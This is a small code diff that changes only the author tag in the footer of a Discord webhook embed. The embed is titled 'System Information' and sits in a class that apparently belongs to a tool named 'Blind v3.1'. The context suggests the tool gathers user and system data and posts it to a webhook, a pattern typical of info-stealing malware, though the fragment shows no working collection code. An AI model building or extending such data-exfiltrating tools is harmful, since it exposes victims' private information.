@@ -16,7 +16,7 @@ class SystemInfo():
     def __init__(self, webhook: str) -> None:
         webhook = SyncWebhook.from_url(webhook)
         embed = Embed(title="System Information", color=0x24262A)
-        embed.set_footer(text="Blind v3.1 · Created by: readdone#9772")
+        embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
 
         embed.add_field(
             name=self.user_data()[0],
